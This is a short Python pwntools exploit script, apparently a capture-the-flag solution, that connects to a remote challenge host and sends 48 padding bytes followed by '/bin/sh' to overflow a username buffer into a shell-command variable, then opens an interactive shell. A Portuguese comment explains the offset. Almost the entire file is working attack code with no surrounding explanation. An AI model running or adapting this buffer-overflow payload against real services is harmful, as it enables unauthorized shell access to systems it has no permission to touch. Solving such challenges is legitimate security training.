from pwn import *

p = remote('chatelaine.cylabacademy.net', 33903)

# Preenche os 48 bytes exatos até a variável shell e coloca o comando sem espaço
payload = b'A' * 48 + b'/bin/sh'

p.sendlineafter(b'Enter username: ', payload)
p.interactive()
